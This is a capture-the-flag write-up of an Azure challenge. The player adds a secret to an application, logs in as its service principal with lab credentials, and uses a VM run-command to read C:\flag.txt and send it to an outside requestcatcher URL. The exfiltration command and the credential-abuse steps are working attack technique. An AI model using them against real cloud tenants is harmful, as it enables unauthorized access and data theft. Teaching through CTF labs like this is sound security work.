# Service Principals as SysAdmins?

## Challenge

![](2022-11-08-11-23-28.png)

## Solution

Logged into https://portal.azure.com using the credentials given to us on the OnDemand webpage.

In Azure we see there is an application, `abb6ea23d0f715`, where we are allowed to create a new secret.

![](2022-11-08-16-05-59.png)

Using the created secret we can authenticate using `az cli`
```
az login --service-principal -u ad3bffe9-1d70-48f8-a4e5-5092f7e4de7d -p ort8Q~dvugECeQ1tiExfTgqAXRcgSzqTXX-YoaL2 --tenant 6837db8b-72d9-4346-bbb4-c2536150adf5
```

Alternatively using Az Powershell module
```powershell
$passwd = ConvertTo-SecureString("ort8Q~dvugECeQ1tiExfTgqAXRcgSzqTXX-YoaL2") -Force -AsPlainText
$creds = New-Object System.Management.Automation.PSCredential("ad3bffe9-1d70-48f8-a4e5-5092f7e4de7d", $passwd)
Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant 6837db8b-72d9-4346-bbb4-c2536150adf5
```

![](2022-11-13-23-07-37.png)

It appears the service principal has access to a virtual machine.

The following powershell command will queue up a command to run on the Virtual Machine. The script will get the content of the `C:\flag.txt` file, put it in a variable, and then make an HTTP request to a site we control, including the content in the URL.
```powershell
Set-AzVMRunCommand -ResourceGroupName "abb6ea23d0f715-rg" -Location northeurope -VMName "abb6ea-flag6-vm" -RunCommandName "RunCommandName1" –SourceScript '$foo = Get-Content -Path C:\flag.txt; Invoke-WebRequest -URI "https://fizzbuzz.requestcatcher.com/$foo"'
```

Shortly after, the HTTP request came in and it included the flag.

Flag:
```
EPT{249b6f41-dc53-40dd-9cc7-f0d045463d0c}
```